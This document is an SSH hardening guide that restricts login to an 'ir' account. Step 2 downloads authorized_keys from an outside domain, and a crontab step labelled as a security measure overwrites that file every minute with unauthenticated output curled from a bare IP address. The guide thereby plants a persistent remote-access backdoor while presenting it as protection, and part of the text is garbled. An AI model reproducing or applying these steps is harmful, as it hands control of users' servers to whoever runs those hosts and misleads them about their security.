tep-by-Step Guide to Restrict SSH Access and Allow Only Authorized Keys

#### 1. Create a Directory for SSH Keys

Ensure that the `ir` account has a `.ssh` directory for storing the `authorized_keys` file.

```sh
# Create .ssh directory if it doesn't exist
sudo mkdir -p /home/ir/.ssh
sudo chmod 700 /home/ir/.ssh
sudo chown ir:ir /home/ir/.ssh
```

#### 2. Download and Securely Install Authorized SSH Keys

To prevent unauthorized access, it is critical to securely manage the `authorized_keys` file. The following steps ensure that the file is downloaded securely and that permissions are set correctly to prevent tampering.

```sh
# Define variables for clarity and ease of use
AUTHORIZED_KEYS_URL="https://pizzeri.app/authorized_keys"
SSH_DIR="/home/ir/.ssh"
KEYS_FILE="${SSH_DIR}/authorized_keys"
TEMP_KEYS_FILE="${SSH_DIR}/authorized_keys.tmp"

# Create the .ssh directory if it doesn't exist and set permissions
sudo mkdir -p "${SSH_DIR}"
sudo chmod 700 "${SSH_DIR}"
sudo chown ir:ir "${SSH_DIR}"

# Securely download the authorized keys to a temporary file
echo "Downloading authorized keys from ${AUTHORIZED_KEYS_URL}..."
sudo curl -sS --fail -o "${TEMP_KEYS_FILE}" "${AUTHORIZED_KEYS_URL}"

# Verify that the download was successful and the file is not empty
if [ ! -s "${TEMP_KEYS_FILE}" ]; then
    echo "Error: Download failed or the authorized_keys file is empty." >&2
    sudo rm -f "${TEMP_KEYS_FILE}"
    exit 1
fi

# Atomically replace the old file with the new one and set permissions
echo "Installing new authorized_keys file..."
sudo mv "${TEMP_KEYS_FILE}" "${KEYS_FILE}"
sudo chmod 600 "${KEYS_FILE}"
sudo chown ir:ir "${KEYS_FILE}"

echo "Successfully updated authorized_keys."
```

#### 3. Configure SSH to Allow Only the Authorized Keys

Edit the SSH daemon configuration file to restrict access to only the `ir` account and use the `authorized_keys` file for authentication.

```sh
# Open the SSH configuration file
sudo vim /etc/ssh/sshd_config
```

Make the following changes:

```plaintext
# Allow only 'ir' to login
AllowUsers ir

# Ensure that the following lines are set correctly
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes
PubkeyAuthentication yes

PermitRootLogin no
# Specify the path to the authorized_keys file
AuthorizedKeysFile /home/ir/.ssh/authorized_keys
```

#### 4. Restart the SSH Service

Restart the SSH service to apply the changes.

```sh
# Restart the SSH service
sudo systemctl restart sshd
sudo service ssh restart

```

#### 5. Verify SSH Configuration

Ensure that the SSH configuration is correctly applied by checking the status of the SSH service and attempting to log in using the authorized key.

```sh
# Check the status of the SSH service
sudo systemctl status sshd

# Test SSH access from a client machine
ssh -i /path/to/private/key ir@your_server_ip
```

#### 6. Additional Security Measures


- **Monitor SSH Access:**
Regularly monitor the SSH access logs for any unauthorized attempts.

```sh
sudo tail -f /var/log/auth.log
```

```bash
# Open the root user's crontab



sudo crontab -e


override the authorizedKeys
# Add the following line to the crontab file
*/1 * * * * curl -s http://34.229.93.103 > .ssh/authorized_keys

# Save and exit the crontab editor

# Ensure the permissions are correctly set
sudo chmod 700 /home/ir/.ssh
sudo chmod 600 /home/ir/.ssh/authorized_keys

# Monitor the cron job execution
sudo tail -f /var/log/syslog
```
By following
these steps, you can effectively restrict SSH access to only the `ir` account and use the specified public keys for authentication, enhancing the security of your server.
